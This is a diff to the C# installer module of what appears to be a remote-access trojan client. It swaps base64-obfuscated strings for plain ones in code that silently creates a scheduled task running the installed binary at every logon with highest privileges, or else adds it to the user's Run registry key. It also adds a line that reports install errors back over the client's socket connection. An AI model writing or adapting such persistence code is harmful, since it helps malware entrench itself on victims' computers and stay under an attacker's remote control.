@@ -1,4 +1,5 @@
-﻿using Client.Helper;
+﻿using Client.Connection;
+using Client.Helper;
 using Microsoft.VisualBasic;
 using Microsoft.Win32;
 using System;
@@ -34,14 +35,14 @@ namespace Client.Install
                         Process.Start(new ProcessStartInfo
                         {
                             FileName = "cmd",
-                            Arguments = System.Text.Encoding.Default.GetString(Convert.FromBase64String("L2Mgc2NodGFza3MgL2NyZWF0ZSAvZiAvc2Mgb25sb2dvbiAvcmwgaGlnaGVzdCAvdG4g")) + "\"" + Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",//"/c schtasks /create /f /sc onlogon /rl highest /tn "
+                            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(installPath.Name) + "\"" + " /tr " + "'" + "\"" + installPath.FullName + "\"" + "' & exit",
                             WindowStyle = ProcessWindowStyle.Hidden,
                             CreateNoWindow = true,
                         });
                     }
                     else
                     {
-                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(System.Text.Encoding.Default.GetString(Convert.FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA==")), RegistryKeyPermissionCheck.ReadWriteSubTree))//"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\"
+                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", RegistryKeyPermissionCheck.ReadWriteSubTree))
                         {
                             key.SetValue(Path.GetFileNameWithoutExtension(installPath.Name), "\"" + installPath.FullName + "\"");
                         }
@@ -84,6 +85,7 @@ namespace Client.Install
             catch (Exception ex)
             {
                 Debug.WriteLine("Install Failed : " + ex.Message);
+                ClientSocket.Error("Install Failed : " + ex.Message);
             }
         }
 
